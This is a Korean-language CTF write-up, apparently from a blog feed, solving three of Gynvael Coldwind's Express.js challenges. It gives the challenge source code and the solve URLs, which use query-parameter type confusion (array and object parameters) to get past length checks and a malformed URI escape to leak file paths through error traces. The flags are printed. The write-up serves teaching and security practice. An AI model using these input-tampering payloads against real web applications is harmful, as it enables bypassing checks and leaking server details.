          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Express Challenge Write Up (Gynvael Coldwind)</title>
      <link href="2021/01/24/2021-01-24-express-challenge/"/>
      <url>2021/01/24/2021-01-24-express-challenge/</url>
      
        <content type="html"><![CDATA[<p><strong>트위터에서 Gynvael Coldwind라는 분이 만든 Express Challenge 입니다.</strong><br></p><hr><h3 id="Challenge-1"><a href="#Challenge-1" class="headerlink" title="Challenge 1"></a>Challenge 1</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Level <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PORT = <span class="number">5001</span></span><br><span class="line"><span class="keyword">const</span> FLAG = process.env.FLAG || <span class="string">&quot;???&quot;</span></span><br><span class="line"><span class="keyword">const</span> SOURCE = fs.readFileSync(<span class="string">&#x27;app.js&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.statusCode = <span class="number">200</span></span><br><span class="line">  res.setHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/plain;charset=utf-8&#x27;</span>)</span><br><span class="line">  res.write(<span class="string">&quot;Level 1\n\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!(<span class="string">&#x27;secret&#x27;</span> <span class="keyword">in</span> req.query)) &#123;</span><br><span class="line">    res.end(SOURCE)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (req.query.secret.length &gt; <span class="number">5</span>) &#123;</span><br><span class="line">    res.end(<span class="string">&quot;I don&#x27;t allow it.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (req.query.secret != <span class="string">&quot;GIVEmeTHEflagNOW&quot;</span>) &#123;</span><br><span class="line">    res.end(<span class="string">&quot;Wrong secret.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  res.end(FLAG)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(PORT, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`Example app listening at port <span class="subst">$&#123;PORT&#125;</span>`</span>)</span><br><span class="line">&#125;) </span><br></pre></td></tr></table></figure><p><strong>Challenge 1의 솔브 조건을 확인해보면 Query String인 secret의 길이가 5 이상이면 안 되고, secret의 값이 <code>GIVEmeTHEflagNOW</code>여야 합니다. 하지만 해당 값은 길이가 16 이므로 5 이상이기 때문에 중간에 끊기게 됩니다.</strong><br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">＞ <span class="keyword">var</span> secret = [<span class="string">&#x27;GIVEmeTHEflagNOW&#x27;</span>];</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">＞ secret.length</span><br><span class="line"><span class="number">1</span></span><br><span class="line">＞ <span class="keyword">if</span> (secret == <span class="string">&#x27;GIVEmeTHEflagNOW&#x27;</span>)&#123;<span class="built_in">console</span>.log(<span class="number">1</span>);&#125;</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure><p><strong> 하지만 Express.js는 Object로 Query String을 보내줄 수 있기 때문에 이를 이용해서 보내주면 길이는 1, secret의 값은 <code>GIVEmeTHEflagNOW</code>가 되므로 문제를 해결할 수 있습니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solve Payload : http:&#x2F;&#x2F;challenges.gynvael.stream:5001&#x2F;?secret[]&#x3D;GIVEmeTHEflagNOW</span><br></pre></td></tr></table></figure><p><code>FLAG : CTF&#123;SmellsLikePHP&#125;</code></p><hr><h3 id="Challenge-2"><a href="#Challenge-2" class="headerlink" title="Challenge 2"></a>Challenge 2</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">Level <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PORT = <span class="number">5002</span></span><br><span class="line"><span class="keyword">const</span> FLAG = process.env.FLAG || <span class="string">&quot;???&quot;</span></span><br><span class="line"><span class="keyword">const</span> SOURCE = fs.readFileSync(<span class="string">&#x27;app.js&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.statusCode = <span class="number">200</span></span><br><span class="line">  res.setHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/plain;charset=utf-8&#x27;</span>)</span><br><span class="line">  res.write(<span class="string">&quot;Level 2\n\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!(<span class="string">&#x27;X&#x27;</span> <span class="keyword">in</span> req.query)) &#123;</span><br><span class="line">    res.end(SOURCE)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (req.query.X.length &gt; <span class="number">800</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> s = <span class="built_in">JSON</span>.stringify(req.query.X)</span><br><span class="line">    <span class="keyword">if</span> (s.length &gt; <span class="number">100</span>) &#123;</span><br><span class="line">      res.end(<span class="string">&quot;Go away.&quot;</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> k = <span class="string">&#x27;&lt;&#x27;</span> + req.query.X + <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">      res.end(<span class="string">&quot;Close, but no cigar.&quot;</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">      res.end(FLAG)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.end(<span class="string">&quot;No way.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(PORT, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`Challenge listening at port <span class="subst">$&#123;PORT&#125;</span>`</span>)</span><br><span class="line">&#125;) </span><br></pre></td></tr></table></figure><p><strong><code>req.query.X</code>의 길이는 800보다 커야 하고, <code>JSON.stringify(req.query.X)</code>의 값은 100보다 작아야 합니다. </strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bypass Payload: http:&#x2F;&#x2F;challenges.gynvael.stream:5002&#x2F;?X[length]&#x3D;801</span><br></pre></td></tr></table></figure><p><strong>Express.js는 Object로 값을 보내줄 수 있다는 것을 알고 있습니다. 위 조건문은 위 Payload를 이용해서 쉽게 우회할 수 있습니다. </strong><br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (req.query.X.length &gt; <span class="number">800</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> s = <span class="built_in">JSON</span>.stringify(req.query.X)</span><br><span class="line">  <span class="keyword">if</span> (s.length &gt; <span class="number">100</span>) &#123;</span><br><span class="line">    res.end(<span class="string">&quot;Go away.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><strong><code>req.query.X.length</code>를 참조하면 801, <code>JSON.stringify()</code> 메서드를 이용해서 Query String을 문자열로 만들게 되면 길이가 길어봐야 35정도(최종 페이로드 기준) 될 것이기 때문에 쉽게 우회할 수 있습니다.</strong><br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> k = <span class="string">&#x27;&lt;&#x27;</span> + req.query.X + <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">  res.end(<span class="string">&quot;Close, but no cigar.&quot;</span>)</span><br><span class="line">&#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">  res.end(FLAG)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>try/catch 문을 보면 catch 문에서 flag를 출력해주는 것을 볼 수 있습니다. catch 문으로 가기 위해서는 try 문에서 에러를 내뱉게 해야 합니다. <code>const k = &#39;&lt;&#39; + req.query.X + &#39;&gt;&#39;</code>를 보면 문자열과 오브젝트 값을 더해주는 것을 볼 수 있습니다.</strong><br></p><p><strong>Object와 문자열을 더해주면 오브젝트 값을 암시적으로 문자열로 변환해주는 메서드를 호출한다고 합니다. Javascript에서는 문자열로 변환해주는 메서드는 toString() 입니다.</strong><br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">＞ <span class="keyword">var</span> a = &#123;<span class="attr">toString</span>:<span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">＞ secret.length</span><br><span class="line"><span class="number">1</span></span><br><span class="line">＞ <span class="keyword">const</span> s = <span class="string">&#x27;&lt;&#x27;</span> + a + <span class="string">&#x27;&gt;&#x27;</span>;</span><br><span class="line">ⓧ ▶Uncaught <span class="built_in">TypeError</span>: Cannot convert object to primitive value</span><br><span class="line">      at &lt;anonymous&gt;:<span class="number">1</span>:<span class="number">15</span></span><br></pre></td></tr></table></figure><p><strong>Object 값으로 toString으로 보내줬습니다. 그 다음 <code>const s = &#39;&lt;&#39; + a + &#39;&gt;&#39;;</code>에서는 a 의 값이 Object이기 때문에 toString를 호출하게 됩니다. 이때 toString을 <code>a.toString</code> 이렇게 호출하게 되는데 a의 toString 값은 위에 보면 ‘’로 재정의  때문에 Object를 문자열로 변환해주지 못 해 에러가 발생하게 됩니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solve Payload : http:&#x2F;&#x2F;challenges.gynvael.stream:5002&#x2F;?X[length]&#x3D;801&amp;X[toString]</span><br></pre></td></tr></table></figure><p><code>FLAG : CTF&#123;WaaayBeyondPHPLikeWTF&#125;</code></p><hr><h3 id="Challenge-3"><a href="#Challenge-3" class="headerlink" title="Challenge 3"></a>Challenge 3</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Level <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// IMPORTANT <span class="doctag">NOTE:</span></span></span><br><span class="line"><span class="comment">// The secret flag you need to find is in the path name of this JavaScript file.</span></span><br><span class="line"><span class="comment">// So yes, to solve the task, you just need to find out what&#x27;s the path name of</span></span><br><span class="line"><span class="comment">// this node.js/express script on the filesystem and that&#x27;s it.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PORT = <span class="number">5003</span></span><br><span class="line"><span class="keyword">const</span> FLAG = process.env.FLAG || <span class="string">&quot;???&quot;</span></span><br><span class="line"><span class="keyword">const</span> SOURCE = fs.readFileSync(path.basename(__filename))</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.statusCode = <span class="number">200</span></span><br><span class="line">  res.setHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/plain;charset=utf-8&#x27;</span>)</span><br><span class="line">  res.write(<span class="string">&quot;Level 3\n\n&quot;</span>)</span><br><span class="line">  res.end(SOURCE)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/truecolors/:color&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.statusCode = <span class="number">200</span></span><br><span class="line">  res.setHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/plain;charset=utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> color = (<span class="string">&#x27;color&#x27;</span> <span class="keyword">in</span> req.params) ? req.params.color : <span class="string">&#x27;???&#x27;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (color === <span class="string">&#x27;red&#x27;</span> || color === <span class="string">&#x27;green&#x27;</span> || color === <span class="string">&#x27;blue&#x27;</span>) &#123;</span><br><span class="line">    res.end(<span class="string">&#x27;Yes! A true color!&#x27;</span>)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.end(<span class="string">&#x27;Hmm? No.&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(PORT, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`Challenge listening at port <span class="subst">$&#123;PORT&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong>위쪽에 디스크립션을 보면 flag는 javascript 파일이 위치한 경로 파일 이름으로 되어 있다고 합니다. 하지만 코드를 보면 알겠지만 Path Traversal 취약점이 발생할 만한 곳은 존재하지 않습니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">TypeError: Cannot convert object to primitive value</span><br><span class="line">    at &#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;app.js:9:19</span><br><span class="line">    at Layer.handle [as handle_request] (&#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)</span><br><span class="line">    at next (&#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;route.js:137:13)</span><br><span class="line">    at Route.dispatch (&#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;route.js:112:3)</span><br><span class="line">    at Layer.handle [as handle_request] (&#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)</span><br><span class="line">    at &#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:281:22</span><br><span class="line">    at Function.process_params (&#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:335:12)</span><br><span class="line">    at next (&#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:275:10)</span><br><span class="line">    at expressInit (&#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;middleware&#x2F;init.js:40:5)</span><br><span class="line">    at Layer.handle [as handle_request] (&#x2F;root&#x2F;project&#x2F;node_Project&#x2F;shop&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)</span><br></pre></td></tr></table></figure><p><strong>하지만 위에러를 보면 에러가 발생한 위치를 절대 경로로 알려주고 있는 것을 볼 수 있습니다. 그러니 해당 문제에서도 에러를 내뱉게만 하면 어디에서 에러가 났는 지 절대 경로로 보여줄 건데, 그때 경로에서 flag를 찾을 수 있을 것 입니다. (위 에러는 문제와 상관 없음)</strong><br></p><p><strong>이렇게 시나리오는 구성했지만 에러를 어디서 내뱉게 해야 할 지 몰라 삽질을 조금 많이 했습니다.</strong><br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">&#x27;/truecolors/:color&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.statusCode = <span class="number">200</span></span><br><span class="line">  res.setHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/plain;charset=utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> color = (<span class="string">&#x27;color&#x27;</span> <span class="keyword">in</span> req.params) ? req.params.color : <span class="string">&#x27;???&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>위 코드를 보면 값을 req.params를 이용해서 color의 값을 받아오는 것을 볼 수 있습니다.</strong><br></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/aa.png?raw=true"><br><strong>req.params에 대해 조금 찾아보니 req.params를 이용해서 값을 받으면, 자동으로 <code>decodeUriComponent()</code> 메서드를 이용해서 값을 디코딩한다고 합니다.</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="built_in">decodeURIComponent</span>(<span class="string">&#x27;%E0%A4%A&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">  <span class="built_in">console</span>.error(e);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// URIError: malformed URI sequence</span></span><br></pre></td></tr></table></figure><p><strong>MDN Web Docs에서 decodeURLComponent() 메서드를 확인해 보니 인자 값으로 위와 같은 값이 들어오면 에러를 내뱉는 다는 것을 알 수 있었습니다.</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">＞ <span class="built_in">decodeURIComponent</span>(<span class="string">&quot;%61&quot;</span>);</span><br><span class="line"><span class="string">&quot;a&quot;</span></span><br><span class="line">＞ <span class="built_in">decodeURIComponent</span>(<span class="string">&quot;%62&quot;</span>);</span><br><span class="line"><span class="string">&quot;b&quot;</span></span><br><span class="line">＞ <span class="built_in">decodeURIComponent</span>(<span class="string">&quot;%63&quot;</span>);</span><br><span class="line"><span class="string">&quot;c&quot;</span></span><br><span class="line">＞ <span class="built_in">decodeURIComponent</span>(<span class="string">&quot;%AA&quot;</span>);</span><br><span class="line">ⓧ ▶Uncaught <span class="built_in">URIError</span>: URI malformed</span><br><span class="line">    at <span class="built_in">decodeURIComponent</span> (&lt;anonymous&gt;)</span><br><span class="line">    at &lt;anonymous&gt;:<span class="number">1</span>:<span class="number">1</span></span><br><span class="line">(anonymous) @ VM208:<span class="number">1</span></span><br><span class="line">＞ <span class="built_in">decodeURIComponent</span>(<span class="string">&quot;%-&quot;</span>);</span><br><span class="line">ⓧ ▶Uncaught <span class="built_in">URIError</span>: URI malformed</span><br><span class="line">    at <span class="built_in">decodeURIComponent</span> (&lt;anonymous&gt;)</span><br><span class="line">    at &lt;anonymous&gt;:<span class="number">1</span>:<span class="number">1</span></span><br></pre></td></tr></table></figure><p><strong>그래서 왜 에러가 나는 지 확인을 해보니 ascii code 범위를 벗어나 매칭 되는 값이 없어서 에러가 나는 거 같았습니다. %AA ~ %FF 이 외에도 여러가지 값들을 다 넣어보니 모두 에러가 나는 것을 확인했습니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">URIError: Failed to decode param &#39;%-&#39;</span><br><span class="line">    at decodeURIComponent (&lt;anonymous&gt;)</span><br><span class="line">    at decode_param (&#x2F;usr&#x2F;src&#x2F;app&#x2F;CTF&#123;TurnsOutItsNotRegexFault&#125;&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:172:12)</span><br><span class="line">    at Layer.match (&#x2F;usr&#x2F;src&#x2F;app&#x2F;CTF&#123;TurnsOutItsNotRegexFault&#125;&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:148:15)</span><br><span class="line">    at matchLayer (&#x2F;usr&#x2F;src&#x2F;app&#x2F;CTF&#123;TurnsOutItsNotRegexFault&#125;&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:574:18)</span><br><span class="line">    at next (&#x2F;usr&#x2F;src&#x2F;app&#x2F;CTF&#123;TurnsOutItsNotRegexFault&#125;&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:220:15)</span><br><span class="line">    at expressInit (&#x2F;usr&#x2F;src&#x2F;app&#x2F;CTF&#123;TurnsOutItsNotRegexFault&#125;&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;middleware&#x2F;init.js:40:5)</span><br><span class="line">    at Layer.handle [as handle_request] (&#x2F;usr&#x2F;src&#x2F;app&#x2F;CTF&#123;TurnsOutItsNotRegexFault&#125;&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)</span><br><span class="line">    at trim_prefix (&#x2F;usr&#x2F;src&#x2F;app&#x2F;CTF&#123;TurnsOutItsNotRegexFault&#125;&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:317:13)</span><br><span class="line">    at &#x2F;usr&#x2F;src&#x2F;app&#x2F;CTF&#123;TurnsOutItsNotRegexFault&#125;&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:284:7</span><br><span class="line">    at Function.process_params (&#x2F;usr&#x2F;src&#x2F;app&#x2F;CTF&#123;TurnsOutItsNotRegexFault&#125;&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:335:12)</span><br></pre></td></tr></table></figure><p><strong>그래서 color의 값으로 %-을 주니 에러가 났고, 예상대로 절대 경로 모두 출력됐고, 절대 경로 내에 flag가 있었습니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solve Payload : http:&#x2F;&#x2F;challenges.gynvael.stream:5003&#x2F;truecolors&#x2F;%-</span><br></pre></td></tr></table></figure><p><code>FLAG : CTF&#123;TurnsOutItsNotRegexFault&#125;</code></p><hr><h3 id="Challenge-4"><a href="#Challenge-4" class="headerlink" title="Challenge 4"></a>Challenge 4</h3><p>(Writing)</p><hr><h3 id="Challenge-5"><a href="#Challenge-5" class="headerlink" title="Challenge 5"></a>Challenge 5</h3><p>(Writing)</p><hr><h3 id="Challenge-6"><a href="#Challenge-6" class="headerlink" title="Challenge 6"></a>Challenge 6</h3><p>(Writing)</p><hr>]]></content>
      
      
      <categories>
          
          <category> Express.js Challenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Express.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0-day RCE in vBulletin</title>
      <link href="2021/01/20/2021-01-20-0-Day-RCE-in-vBulletin/"/>
      <url>2021/01/20/2021-01-20-0-Day-RCE-in-vBulletin/</url>
      
